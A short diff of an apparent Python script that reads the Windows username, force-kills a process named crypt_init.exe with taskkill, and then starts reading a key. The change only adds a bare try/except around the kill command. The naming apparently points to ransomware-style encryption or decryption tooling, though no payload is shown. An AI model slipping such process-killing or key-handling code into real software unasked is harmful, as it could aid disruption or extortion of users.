@@ -9,9 +9,11 @@ current_user = os.environ["USERNAME"]
 
 # FUNCTION TO STOP CRYPT INIT
 def kill_init():
-    cmd = "taskkill /IM crypt_init.exe /f"
-    os.system(cmd)
-
+    try:
+        cmd = "taskkill /IM crypt_init.exe /f"
+        os.system(cmd)
+    except:
+        pass
 kill_init()
 
 # DEFINE PATH TO LOCATE AND READ THE KEY
